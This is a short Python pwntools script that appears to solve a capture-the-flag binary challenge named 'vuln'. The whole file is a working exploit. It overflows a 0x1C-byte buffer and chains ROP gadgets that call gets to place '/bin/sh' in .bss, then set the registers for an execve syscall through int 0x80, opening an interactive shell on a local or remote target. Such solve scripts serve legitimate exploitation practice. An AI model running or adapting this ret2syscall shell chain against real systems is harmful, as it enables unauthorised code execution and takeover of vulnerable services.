#!/bin/python3
from pwn import *

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

binary = context.binary = ELF("./vuln")

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

if args.LOCAL:
    if args.GDBSCRIPT:
        io: tube = gdb.debug(binary.path, gdbscript=args.GDBSCRIPT)
    else:
        io: tube = process(binary.path)
else:
    io: tube = remote(host, port)

###########
# EXPLOIT #
###########
find = ROP(binary).find_gadget
payload = flat([
    b"A" * 0x1C,
    p32(binary.symbols["gets"]),
    p32(find(["pop eax", "ret"]).address), # Just so gets return properly
    p32(binary.bss(0)),
    p32(find(["pop eax", "ret"]).address),
    p32(0xB),
    p32(find(["pop edx", "pop ebx", "pop esi", "ret"]).address),
    p32(binary.bss(8)),
    p32(binary.bss(0)),
    p32(0),
    p32(find(["pop ecx", "ret"]).address),
    p32(binary.bss(8)),
    p32(find(["int 0x80"]).address)
])

io.sendline(payload)
io.sendline(b"/bin/sh" + b"\x00" * 9)
io.interactive()
